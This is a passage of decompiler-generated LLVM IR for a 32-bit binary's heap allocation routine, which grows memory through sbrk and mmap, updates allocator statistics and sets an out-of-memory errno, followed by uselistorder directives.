  %v2_80538a2 = sub i32 %v2_8053893, %v1_8053890
  store i32 %v2_80538a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538a4

dec_label_pc_80538a4:                             ; preds = %dec_label_pc_805387d, %dec_label_pc_80538a2
  %v0_80538a8 = phi i32 [ %v2_8053893, %dec_label_pc_805387d ], [ %v2_80538a2, %dec_label_pc_80538a2 ]
  %v5_80538a8 = add i32 %v0_80538a8, %v1_80537b0
  store i32 %v5_80538a8, i32* %eax.global-to-local, align 4
  %v1_80538ac = sub i32 0, %v0_805377c
  store i32 %v1_80538ac, i32* @edx, align 4
  %v2_80538b4 = and i32 %v5_80538a8, %v1_80538ac
  store i32 %v2_80538b4, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_80538b4, 1
  br i1 %tmp88, label %dec_label_pc_80538ce, label %dec_label_pc_80538b8

dec_label_pc_80538b8:                             ; preds = %dec_label_pc_80538a4
  store i32 %v2_80538b4, i32* %stack_var_-92, align 4
  %v1_80538bc = call i32 @__GI_sbrk(i32 %v2_80538b4)
  store i32 %v1_80538bc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80538bc, i32* @ebx, align 4
  %v10_80538c9 = icmp eq i32 %v1_80538bc, -1
  %v1_80538cc = icmp eq i1 %v10_80538c9, false
  br i1 %v1_80538cc, label %dec_label_pc_8053924.dec_label_pc_805392d_crit_edge, label %dec_label_pc_80538b8.dec_label_pc_80538ce_crit_edge

dec_label_pc_80538b8.dec_label_pc_80538ce_crit_edge: ; preds = %dec_label_pc_80538b8
  %v0_80538ce.pre = load i8, i8* @global_var_8065f40.974, align 64
  br label %dec_label_pc_80538ce

dec_label_pc_80538ce:                             ; preds = %dec_label_pc_80538b8.dec_label_pc_80538ce_crit_edge, %dec_label_pc_80538a4
  %v0_80538fa = phi i32 [ -1, %dec_label_pc_80538b8.dec_label_pc_80538ce_crit_edge ], [ %v1_80538ac, %dec_label_pc_80538a4 ]
  %v0_80538ce = phi i8 [ %v0_80538ce.pre, %dec_label_pc_80538b8.dec_label_pc_80538ce_crit_edge ], [ %v0_8053899, %dec_label_pc_80538a4 ]
  %v1_80538ce = urem i8 %v0_80538ce, 2
  %v2_80538ce = icmp eq i8 %v1_80538ce, 0
  br i1 %v2_80538ce, label %dec_label_pc_80538ce.dec_label_pc_80538e3_crit_edge, label %dec_label_pc_80538d7

dec_label_pc_80538ce.dec_label_pc_80538e3_crit_edge: ; preds = %dec_label_pc_80538ce
  %v0_80538e3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80538e3

dec_label_pc_80538d7:                             ; preds = %dec_label_pc_80538ce
  %v2_80538db = add i32 %v1_8053890, %v1_80537b0
  store i32 %v2_80538db, i32* %eax.global-to-local, align 4
  %v0_80538dd = load i32, i32* @esi, align 4
  %v2_80538dd = add i32 %v0_80538dd, %v2_80538db
  %v5_80538df = and i32 %v2_80538dd, %v1_80538ac
  store i32 %v5_80538df, i32* @esi, align 4
  br label %dec_label_pc_80538e3

dec_label_pc_80538e3:                             ; preds = %dec_label_pc_80538ce.dec_label_pc_80538e3_crit_edge, %dec_label_pc_80538d7
  %v0_80538e3 = phi i32 [ %v0_80538e3.pre, %dec_label_pc_80538ce.dec_label_pc_80538e3_crit_edge ], [ %v5_80538df, %dec_label_pc_80538d7 ]
  %tmp132 = icmp ult i32 %v0_80538e3, 1048576
  br i1 %tmp132, label %dec_label_pc_80538eb, label %dec_label_pc_80538f0

dec_label_pc_80538eb:                             ; preds = %dec_label_pc_80538e3
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_80538f0

dec_label_pc_80538f0:                             ; preds = %dec_label_pc_80538e3, %dec_label_pc_80538eb
  %v0_8053904 = phi i32 [ %v0_80538e3, %dec_label_pc_80538e3 ], [ 1048576, %dec_label_pc_80538eb ]
  %tmp133 = icmp ugt i32 %v0_8053904, %v1_80537da
  br i1 %tmp133, label %dec_label_pc_80538fa, label %dec_label_pc_8053b32

dec_label_pc_80538fa:                             ; preds = %dec_label_pc_80538f0
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053907 = call i32 @mmap(i32 0, i32 %v0_8053904, i32 3, i32 34, i32 0, i32 0, i32 %v0_80538fa, i32 %v0_80538fa)
  store i32 %v8_8053907, i32* %eax.global-to-local, align 4
  store i32 %v8_8053907, i32* @ebx, align 4
  %v10_8053911 = icmp eq i32 %v8_8053907, -1
  br i1 %v10_8053911, label %dec_label_pc_8053b32, label %dec_label_pc_8053924.thread

dec_label_pc_8053924.thread:                      ; preds = %dec_label_pc_80538fa
  %v0_805391a = load i8, i8* @global_var_8065f40.974, align 1
  %v2_805391a = and i8 %v0_805391a, -2
  store i8 %v2_805391a, i8* @global_var_8065f40.974, align 64
  %v1_8053921 = load i32, i32* @esi, align 4
  %v2_8053921 = add i32 %v1_8053921, %v8_8053907
  store i32 %v2_8053921, i32* @edx, align 4
  br label %dec_label_pc_805392d

dec_label_pc_8053924.dec_label_pc_805392d_crit_edge: ; preds = %dec_label_pc_80538b8
  %v1_8053931.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805392d

dec_label_pc_805392d:                             ; preds = %dec_label_pc_8053924.dec_label_pc_805392d_crit_edge, %dec_label_pc_8053924.thread
  %v1_8053931 = phi i32 [ %v1_8053921, %dec_label_pc_8053924.thread ], [ %v1_8053931.pre, %dec_label_pc_8053924.dec_label_pc_805392d_crit_edge ]
  %v0_80539f992 = phi i32 [ %v8_8053907, %dec_label_pc_8053924.thread ], [ %v1_80538bc, %dec_label_pc_8053924.dec_label_pc_805392d_crit_edge ]
  %v0_80539eb91 = phi i32 [ %v2_8053921, %dec_label_pc_8053924.thread ], [ -1, %dec_label_pc_8053924.dec_label_pc_805392d_crit_edge ]
  %v0_8053931 = load i32, i32* @global_var_8065f48.971, align 8
  %v2_8053931 = add i32 %v1_8053931, %v0_8053931
  store i32 %v2_8053931, i32* @global_var_8065f48.971, align 8
  %v2_8053937 = add i32 %v1_8053890, %v0_805387d
  store i32 %v2_8053937, i32* %ecx.global-to-local, align 4
  %v2_8053939 = sub i32 %v0_80539f992, %v2_8053937
  %v7_8053939 = icmp ult i32 %v0_80539f992, %v2_8053937
  %v12_8053939 = icmp eq i32 %v2_8053939, 0
  %v1_805393b = icmp eq i1 %v12_8053939, false
  br i1 %v1_805393b, label %dec_label_pc_8053954, label %dec_label_pc_805393d

dec_label_pc_805393d:                             ; preds = %dec_label_pc_805392d
  %v10_805393d = icmp eq i32 %v0_80539eb91, -1
  %v1_8053940 = icmp eq i1 %v10_805393d, false
  br i1 %v1_8053940, label %dec_label_pc_8053954, label %dec_label_pc_8053942

dec_label_pc_8053942:                             ; preds = %dec_label_pc_805393d
  %v2_8053942 = add i32 %v1_8053931, %v1_8053890
  store i32 %v0_805387d, i32* %ecx.global-to-local, align 4
  %v1_8053949 = or i32 %v2_8053942, 1
  store i32 %v1_8053949, i32* %eax.global-to-local, align 4
  store i32 %v1_8053949, i32* %v2_8053886, align 4
  br label %dec_label_pc_8053a81

dec_label_pc_8053954:                             ; preds = %dec_label_pc_805393d, %dec_label_pc_805392d
  %v0_8053954 = load i8, i8* @global_var_8065f40.974, align 1
  %v1_8053954 = sext i8 %v0_8053954 to i32
  store i32 %v1_8053954, i32* %eax.global-to-local, align 4
  %v2_8053959 = urem i8 %v0_8053954, 2
  %v3_8053959 = icmp eq i8 %v2_8053959, 0
  br i1 %v3_8053959, label %dec_label_pc_805396d, label %dec_label_pc_805395d

dec_label_pc_805395d:                             ; preds = %dec_label_pc_8053954
  br i1 %v2_8053890, label %dec_label_pc_805396d, label %dec_label_pc_8053961

dec_label_pc_8053961:                             ; preds = %dec_label_pc_805395d
  %v1_8053963 = icmp eq i1 %v7_8053939, false
  br i1 %v1_8053963, label %dec_label_pc_805396d, label %dec_label_pc_8053965

dec_label_pc_8053965:                             ; preds = %dec_label_pc_8053961
  %v1_8053965 = and i32 %v1_8053954, -2
  %v4_8053965 = trunc i32 %v1_8053965 to i8
  store i32 %v1_8053965, i32* %eax.global-to-local, align 4
  store i8 %v4_8053965, i8* @global_var_8065f40.974, align 64
  br label %dec_label_pc_805396d

dec_label_pc_805396d:                             ; preds = %dec_label_pc_8053961, %dec_label_pc_805395d, %dec_label_pc_8053954, %dec_label_pc_8053965
  %v0_805396d = phi i8 [ %v0_8053954, %dec_label_pc_8053961 ], [ %v0_8053954, %dec_label_pc_805395d ], [ %v0_8053954, %dec_label_pc_8053954 ], [ %v4_8053965, %dec_label_pc_8053965 ]
  %v1_805396d = urem i8 %v0_805396d, 2
  %v2_805396d = icmp eq i8 %v1_805396d, 0
  br i1 %v2_805396d, label %dec_label_pc_80539eb, label %dec_label_pc_8053976

dec_label_pc_8053976:                             ; preds = %dec_label_pc_805396d
  br i1 %v2_8053890, label %dec_label_pc_8053984, label %dec_label_pc_805397a

dec_label_pc_805397a:                             ; preds = %dec_label_pc_8053976
  store i32 %v2_8053939, i32* %eax.global-to-local, align 4
  %v2_805397e = add i32 %v2_8053931, %v2_8053939
  store i32 %v2_805397e, i32* @global_var_8065f48.971, align 8
  br label %dec_label_pc_8053984

dec_label_pc_8053984:                             ; preds = %dec_label_pc_8053976, %dec_label_pc_805397a
  %v1_8053986 = urem i32 %v0_80539f992, 8
  %v2_8053986 = icmp eq i32 %v1_8053986, 0
  store i32 %v1_8053986, i32* %edx.global-to-local, align 4
  %v1_8053989 = icmp eq i1 %v2_8053986, false
  br i1 %v1_8053989, label %dec_label_pc_8053991, label %dec_label_pc_805398b

dec_label_pc_805398b:                             ; preds = %dec_label_pc_8053984
  store i32 %v0_80539f992, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805399b

dec_label_pc_8053991:                             ; preds = %dec_label_pc_8053984
  %v2_8053996 = sub nsw i32 8, %v1_8053986
  store i32 %v2_8053996, i32* %eax.global-to-local, align 4
  %v2_8053998 = add i32 %v2_8053996, %v0_80539f992
  store i32 %v2_8053998, i32* @edi, align 4
  br label %dec_label_pc_805399b

dec_label_pc_805399b:                             ; preds = %dec_label_pc_805398b, %dec_label_pc_8053991
  %v0_805399e = phi i32 [ 0, %dec_label_pc_805398b ], [ %v2_8053996, %dec_label_pc_8053991 ]
  %v2_805399b = add i32 %v1_8053931, %v0_80539f992
  %v2_805399e = add i32 %v0_805399e, %v1_8053890
  store i32 %v2_805399e, i32* %ecx.global-to-local, align 4
  %v2_80539a7 = add i32 %v2_805399e, %v2_805399b
  store i32 %v2_80539a7, i32* %edx.global-to-local, align 4
  %v2_80539ad = add i32 %v2_80539a7, %v1_80537b0
  %v5_80539b0 = and i32 %v2_80539ad, %v1_80538ac
  %v2_80539b7 = sub i32 %v5_80539b0, %v2_80539a7
  store i32 %v2_80539b7, i32* %eax.global-to-local, align 4
  %v2_80539b9 = add i32 %v2_80539b7, %v2_805399e
  store i32 %v2_80539b9, i32* @esi, align 4
  store i32 %v2_80539b9, i32* %stack_var_-92, align 4
  %v1_80539bd = call i32 @__GI_sbrk(i32 %v2_80539b9)
  store i32 %v1_80539bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80539bd, i32* @edx, align 4
  %v10_80539c7 = icmp eq i32 %v1_80539bd, -1
  %v1_80539ca = icmp eq i1 %v10_80539c7, false
  br i1 %v1_80539ca, label %dec_label_pc_80539da, label %dec_label_pc_80539cc

dec_label_pc_80539cc:                             ; preds = %dec_label_pc_805399b
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80539d1 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80539d1, i32* %eax.global-to-local, align 4
  store i32 %v1_80539d1, i32* @edx, align 4
  br label %dec_label_pc_8053a0e

dec_label_pc_80539da:                             ; preds = %dec_label_pc_805399b
  %v1_80539da = load i32, i32* @ebx, align 4
  %v7_80539da = icmp ult i32 %v1_80539bd, %v1_80539da
  %v1_80539dc = icmp eq i1 %v7_80539da, false
  br i1 %v1_80539dc, label %dec_label_pc_8053a13, label %dec_label_pc_80539de

dec_label_pc_80539de:                             ; preds = %dec_label_pc_80539da
  %v0_80539de = load i8, i8* @global_var_8065f40.974, align 1
  %v2_80539de = and i8 %v0_80539de, -2
  store i8 %v2_80539de, i8* @global_var_8065f40.974, align 64
  store i32 %v2_805399b, i32* @edx, align 4
  br label %dec_label_pc_80539f2

dec_label_pc_80539eb:                             ; preds = %dec_label_pc_805396d
  %v10_80539eb = icmp eq i32 %v0_80539eb91, -1
  br i1 %v10_80539eb, label %dec_label_pc_80539f6, label %dec_label_pc_80539f0

dec_label_pc_80539f0:                             ; preds = %dec_label_pc_80539eb
  store i32 %v0_80539f992, i32* @edi, align 4
  br label %dec_label_pc_80539f2

dec_label_pc_80539f2:                             ; preds = %dec_label_pc_80539de, %dec_label_pc_80539f0
  %v0_8053a1349 = phi i32 [ %v2_805399b, %dec_label_pc_80539de ], [ %v0_80539eb91, %dec_label_pc_80539f0 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053a13

dec_label_pc_80539f6:                             ; preds = %dec_label_pc_80539eb
  store i32 %v0_80539f992, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80539fd = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80539fd, i32* @edx, align 4
  %v1_8053a04 = load i32, i32* @ebx, align 4
  %v2_8053a04 = sub i32 %v1_80539fd, %v1_8053a04
  %v1_8053a06 = load i32, i32* @esi, align 4
  %v2_8053a06 = sub i32 %v2_8053a04, %v1_8053a06
  store i32 %v2_8053a06, i32* %eax.global-to-local, align 4
  %v0_8053a08 = load i32, i32* @global_var_8065f48.971, align 8
  %v2_8053a08 = add i32 %v0_8053a08, %v2_8053a06
  store i32 %v2_8053a08, i32* @global_var_8065f48.971, align 8
  br label %dec_label_pc_8053a0e

dec_label_pc_8053a0e:                             ; preds = %dec_label_pc_80539cc, %dec_label_pc_80539f6
  %v0_8053a1348 = phi i32 [ %v1_80539d1, %dec_label_pc_80539cc ], [ %v1_80539fd, %dec_label_pc_80539f6 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053a13

dec_label_pc_8053a13:                             ; preds = %dec_label_pc_80539da, %dec_label_pc_80539f2, %dec_label_pc_8053a0e
  %v0_8053a18 = phi i32 [ %v1_80539bd, %dec_label_pc_80539da ], [ %v0_8053a1349, %dec_label_pc_80539f2 ], [ %v0_8053a1348, %dec_label_pc_8053a0e ]
  %v10_8053a13 = icmp eq i32 %v0_8053a18, -1
  br i1 %v10_8053a13, label %dec_label_pc_8053a81, label %dec_label_pc_8053a18

dec_label_pc_8053a18:                             ; preds = %dec_label_pc_8053a13
  %v1_8053a18 = load i32, i32* @edi, align 4
  %v2_8053a18 = sub i32 %v0_8053a18, %v1_8053a18
  store i32 %v2_8053a18, i32* @edx, align 4
  store i32 %v1_8053a18, i32* @global_var_8065c0c.959, align 4
  %v1_8053a20 = load i32, i32* @esi, align 4
  %v2_8053a20 = add i32 %v1_8053a20, %v2_8053a18
  %v1_8053a23 = or i32 %v2_8053a20, 1
  store i32 %v1_8053a23, i32* %eax.global-to-local, align 4
  %v2_8053a26 = add i32 %v1_8053a18, 4
  %v3_8053a26 = inttoptr i32 %v2_8053a26 to i32*
  store i32 %v1_8053a23, i32* %v3_8053a26, align 4
  %v0_8053a29 = load i32, i32* @global_var_8065f48.971, align 8
  %v1_8053a29 = load i32, i32* @esi, align 4
  %v2_8053a29 = add i32 %v1_8053a29, %v0_8053a29
  store i32 %v2_8053a29, i32* @global_var_8065f48.971, align 8
  br i1 %v2_8053890, label %dec_label_pc_8053a81, label %dec_label_pc_8053a33

dec_label_pc_8053a33:                             ; preds = %dec_label_pc_8053a18
  %v1_8053a33 = add i32 %v1_8053890, -12
  store i32 %v0_805387d, i32* %ecx.global-to-local, align 4
  %v1_8053a3a = and i32 %v1_8053a33, -8
  store i32 %v1_8053a3a, i32* %eax.global-to-local, align 4
  %v1_8053a3f = or i32 %v1_8053a3a, 1
  store i32 %v1_8053a3f, i32* @edx, align 4
  %v5_8053a42 = icmp ult i32 %v1_8053a3a, 15
  store i32 %v1_8053a3f, i32* %v2_8053886, align 4
  %v0_8053a48 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a48 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a48 = add i32 %v0_8053a48, 4
  %v3_8053a48 = add i32 %v2_8053a48, %v1_8053a48
  %v4_8053a48 = inttoptr i32 %v3_8053a48 to i32*
  store i32 5, i32* %v4_8053a48, align 4
  %v0_8053a50 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a50 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a50 = add i32 %v0_8053a50, 8
  %v3_8053a50 = add i32 %v2_8053a50, %v1_8053a50
  %v4_8053a50 = inttoptr i32 %v3_8053a50 to i32*
  store i32 5, i32* %v4_8053a50, align 4
  br i1 %v5_8053a42, label %dec_label_pc_8053a81, label %dec_label_pc_8053a5a

dec_label_pc_8053a5a:                             ; preds = %dec_label_pc_8053a33
  %v0_8053a5d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a5f = add i32 %v0_8053a5d, 8
  store i32 %v1_8053a5f, i32* %eax.global-to-local, align 4
  %v0_8053a62 = load i32, i32* @global_var_8065f24.975, align 4
  store i32 %v0_8053a62, i32* @ebx, align 4
  store i32 %v1_8053a5f, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8065f24.975, align 4
  %v1_8053a73 = call i32 @free(i32 %v1_8053a5f)
  store i32 %v1_8053a73, i32* %eax.global-to-local, align 4
  %v0_8053a78 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a78, i32* @global_var_8065f24.975, align 4
  br label %dec_label_pc_8053a81

dec_label_pc_8053a81:                             ; preds = %dec_label_pc_8053a33, %dec_label_pc_8053a18, %dec_label_pc_8053a13, %dec_label_pc_8053942, %dec_label_pc_8053a5a
  %v0_8053a81 = load i32, i32* @global_var_8065f48.971, align 8
  store i32 %v0_8053a81, i32* %eax.global-to-local, align 4
  %v1_8053a86 = load i32, i32* @global_var_8065f4c.976, align 4
  %tmp134 = icmp ugt i32 %v0_8053a81, %v1_8053a86
  br i1 %tmp134, label %dec_label_pc_8053a8e, label %dec_label_pc_8053a93

dec_label_pc_8053a8e:                             ; preds = %dec_label_pc_8053a81
  store i32 %v0_8053a81, i32* @global_var_8065f4c.976, align 4
  br label %dec_label_pc_8053a93

dec_label_pc_8053a93:                             ; preds = %dec_label_pc_8053a81, %dec_label_pc_8053a8e
  %v1_8053a93 = load i32, i32* @global_var_8065f44.969, align 4
  %v2_8053a93 = add i32 %v1_8053a93, %v0_8053a81
  store i32 %v2_8053a93, i32* %eax.global-to-local, align 4
  %v1_8053a99 = load i32, i32* @global_var_8065f54.972, align 4
  %tmp135 = icmp ugt i32 %v2_8053a93, %v1_8053a99
  br i1 %tmp135, label %dec_label_pc_8053aa1, label %dec_label_pc_8053aa6

dec_label_pc_8053aa1:                             ; preds = %dec_label_pc_8053a93
  store i32 %v2_8053a93, i32* @global_var_8065f54.972, align 4
  br label %dec_label_pc_8053aa6

dec_label_pc_8053aa6:                             ; preds = %dec_label_pc_8053a93, %dec_label_pc_8053aa1
  %v0_8053aa6 = load i32, i32* @global_var_8065c0c.959, align 4
  store i32 %v0_8053aa6, i32* @ebx, align 4
  %v1_8053aac = add i32 %v0_8053aa6, 4
  %v2_8053aac = inttoptr i32 %v1_8053aac to i32*
  %v3_8053aac = load i32, i32* %v2_8053aac, align 4
  %v1_8053aaf = and i32 %v3_8053aac, -4
  store i32 %v1_8053aaf, i32* @ecx, align 4
  %v10_8053ab2 = icmp ult i32 %v1_8053aaf, %v1_805374f
  br i1 %v10_8053ab2, label %dec_label_pc_8053b32, label %dec_label_pc_8053ab8

dec_label_pc_8053ab8:                             ; preds = %dec_label_pc_8053aa6
  store i32 %v1_80537da, i32* %esi.global-to-local, align 4
  %v2_8053abe = sub i32 %v1_8053aaf, %v1_80537da
  store i32 %v2_8053abe, i32* %ecx.global-to-local, align 4
  %v2_8053ac0 = add i32 %v0_8053aa6, %v1_80537da
  store i32 %v2_8053ac0, i32* @edx, align 4
  %v1_8053ac3 = or i32 %v1_80537da, 1
  store i32 %v1_8053ac3, i32* %eax.global-to-local, align 4
  store i32 %v2_8053ac0, i32* @global_var_8065c0c.959, align 4
  store i32 %v1_8053ac3, i32* %v2_8053aac, align 4
  %v0_8053acf.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053acf

dec_label_pc_8053acf:                             ; preds = %dec_label_pc_8053760, %dec_label_pc_8053ab8
  %v0_8053acf = phi i32 [ %v5_8053773, %dec_label_pc_8053760 ], [ %v0_8053acf.pre, %dec_label_pc_8053ab8 ]
  %v1_8053acf = or i32 %v0_8053acf, 1
  store i32 %v1_8053acf, i32* @ecx, align 4
  %v0_8053ad2 = load i32, i32* @ebx, align 4
  %v1_8053ad2 = add i32 %v0_8053ad2, 8
  store i32 %v1_8053ad2, i32* %ebx.global-to-local, align 4
  %v1_8053ad5 = load i32, i32* @edx, align 4
  %v2_8053ad5 = add i32 %v1_8053ad5, 4
  %v3_8053ad5 = inttoptr i32 %v2_8053ad5 to i32*
  store i32 %v1_8053acf, i32* %v3_8053ad5, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_8053ada:                             ; preds = %dec_label_pc_805351a
  %v5_8053ae0 = sub i32 %v1_80534fd, %v1_80537da
  store i32 %v5_8053ae0, i32* %eax.global-to-local, align 4
  %v2_8053ae4 = add i32 %v0_80535c8111, %v1_80537da
  store i32 %v2_8053ae4, i32* @edx, align 4
  %v1_8053ae8 = or i32 %v1_80537da, 1
  store i32 %v2_8053ae4, i32* @global_var_8065c10.960, align 16
  store i32 %v1_8053ae8, i32* %v2_80534f7, align 4
  %v0_8053af4 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053af6 = load i32, i32* @edx, align 4
  store i32 %v0_8053af6, i32* @global_var_8065c1c.977, align 4
  %v1_8053afc = or i32 %v0_8053af4, 1
  store i32 %v1_8053afc, i32* @ecx, align 4
  store i32 %v0_8053af6, i32* @global_var_8065c20.962, align 32
  %v1_8053b05 = add i32 %v0_8053af6, 8
  %v2_8053b05 = inttoptr i32 %v1_8053b05 to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053b05, align 4
  %v0_8053b0c = load i32, i32* @edx, align 4
  %v1_8053b0c = add i32 %v0_8053b0c, 12
  %v2_8053b0c = inttoptr i32 %v1_8053b0c to i32*
  store i32 ptrtoint (i32* @global_var_8065c14.961 to i32), i32* %v2_8053b0c, align 4
  %v0_8053b13 = load i32, i32* @ecx, align 4
  %v1_8053b13 = load i32, i32* @edx, align 4
  %v2_8053b13 = add i32 %v1_8053b13, 4
  %v3_8053b13 = inttoptr i32 %v2_8053b13 to i32*
  store i32 %v0_8053b13, i32* %v3_8053b13, align 4
  %v0_8053b16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b16 = load i32, i32* @edx, align 4
  %v3_8053b16 = add i32 %v1_8053b16, %v0_8053b16
  %v4_8053b16 = inttoptr i32 %v3_8053b16 to i32*
  store i32 %v0_8053b16, i32* %v4_8053b16, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053b1b:                             ; preds = %dec_label_pc_8053529
  store i32 %v1_80537da, i32* %ebx.global-to-local, align 4
  %v0_8053b1f = load i32, i32* @ebp, align 4
  %v2_8053b1f = or i32 %v1_80537da, 4
  %v3_8053b1f = add i32 %v0_8053b1f, %v2_8053b1f
  %v4_8053b1f = inttoptr i32 %v3_8053b1f to i32*
  %v5_8053b1f = load i32, i32* %v4_8053b1f, align 4
  %v6_8053b1f = or i32 %v5_8053b1f, 1
  store i32 %v6_8053b1f, i32* %v4_8053b1f, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053b24:                             ; preds = %dec_label_pc_8053ada, %dec_label_pc_8053b1b
  %v0_8053b24 = load i32, i32* @ebp, align 4
  %v1_8053b24 = add i32 %v0_8053b24, 8
  store i32 %v1_8053b24, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_8053b29:                             ; preds = %dec_label_pc_8053619
  %v1_8053b29 = load i32, i32* @ebx, align 4
  %v2_8053b29 = add i32 %v0_8053628, 4
  %v3_8053b29 = add i32 %v2_8053b29, %v1_8053b29
  %v4_8053b29 = inttoptr i32 %v3_8053b29 to i32*
  %v5_8053b29 = load i32, i32* %v4_8053b29, align 4
  %v6_8053b29 = or i32 %v5_8053b29, 1
  store i32 %v6_8053b29, i32* %v4_8053b29, align 4
  br label %dec_label_pc_8053b2e

dec_label_pc_8053b2e:                             ; preds = %dec_label_pc_8053631, %dec_label_pc_8053b29
  %v0_8053b2e = load i32, i32* @ecx, align 4
  store i32 %v0_8053b2e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_8053b32:                             ; preds = %dec_label_pc_80538f0, %dec_label_pc_8053aa6, %dec_label_pc_80538fa
  %v0_8053b32 = load i32, i32* %stack_var_-92, align 4
  %v1_8053b32 = call i32 @__errno_location(i32 %v0_8053b32)
  store i32 %v1_8053b32, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053b39 = inttoptr i32 %v1_8053b32 to i32*
  store i32 12, i32* %v1_8053b39, align 4
  br label %dec_label_pc_8053b3f

dec_label_pc_8053b3f:                             ; preds = %dec_label_pc_8053b2e, %dec_label_pc_8053b24, %dec_label_pc_8053acf, %dec_label_pc_805378b, %dec_label_pc_805373d, %dec_label_pc_80534c4, %dec_label_pc_8053b32
  store i32 %v2_80533fb, i32* @eax, align 4
  store i32 %v2_80533fb, i32* %stack_var_-92, align 4
  %v2_8053b48 = call i32 @__pthread_return_void(i32 %v2_80533fb, i32 1)
  store i32 %v2_8053b48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b50

dec_label_pc_8053b50:                             ; preds = %dec_label_pc_8053419, %dec_label_pc_8053b3f
  %v0_8053b53 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053b53, i32* %eax.global-to-local, align 4
  %v2_8053b55 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053b55, i32* @ebx, align 4
  store i32 %v0_80533e8, i32* @esi, align 4
  store i32 %v0_80533e7, i32* @edi, align 4
  store i32 %v0_80533e6, i32* @ebp, align 4
  ret i32 %v0_8053b53

; uselistorder directives
  uselistorder i32 %v0_8053b16, { 1, 0 }
  uselistorder i32 %v0_8053af6, { 1, 0, 2 }
  uselistorder i32 %v2_8053a93, { 1, 0, 2 }
  uselistorder i32 %v0_8053a81, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053a18, { 1, 0 }
  uselistorder i32 %v2_8053a06, { 1, 0 }
  uselistorder i32 %v1_80539bd, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80539a7, { 1, 0, 2 }
  uselistorder i32 %v2_805399b, { 1, 2, 0 }
  uselistorder i32 %v2_8053996, { 1, 0, 2 }
  uselistorder i32 %v1_8053986, { 2, 1, 0 }
  uselistorder i8 %v0_8053954, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053937, { 1, 0, 2 }
  uselistorder i32 %v0_80539eb91, { 2, 0, 1 }
  uselistorder i32 %v0_80539f992, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8053931, { 2, 1, 0 }
  uselistorder i32 %v8_8053907, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053904, { 1, 0 }
  uselistorder i32 %v0_80538e3, { 1, 0 }
  uselistorder i32 %v2_80538b4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80538ac, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053899, { 1, 0 }
  uselistorder i32 %v1_8053890, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_805387d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8053861, { 1, 0, 2 }
  uselistorder i32 %v2_805384d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053816, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805380a, { 2, 1, 0 }
  uselistorder i32 %v8_80537f9, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_80537e0, { 1, 0, 2 }
  uselistorder i32 %v0_805377c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805374f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053745, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8053737, { 1, 0 }
  uselistorder i32 %v1_80536ce, { 1, 0 }
  uselistorder i32 %v3_80536c2, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_80536d2, { 1, 0 }
  uselistorder i32 %v2_80536bc, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80536b912, { 1, 0 }
  uselistorder i32 %v2_80536ae, { 1, 0 }
  uselistorder i32 %v1_8053692, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805368e, { 2, 1, 0 }
  uselistorder i32 %v1_805368a, { 1, 0 }
  uselistorder i32 %v1_805367e, { 2, 1, 0 }
  uselistorder i32 %v2_8053674, { 1, 0 }
  uselistorder i32 %v1_8053671, { 1, 2, 0 }
  uselistorder i32 %v4_805360f, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_805365a, { 1, 0 }
  uselistorder i32 %v0_8053628, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80535fb, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80535c8, { 1, 2, 0 }
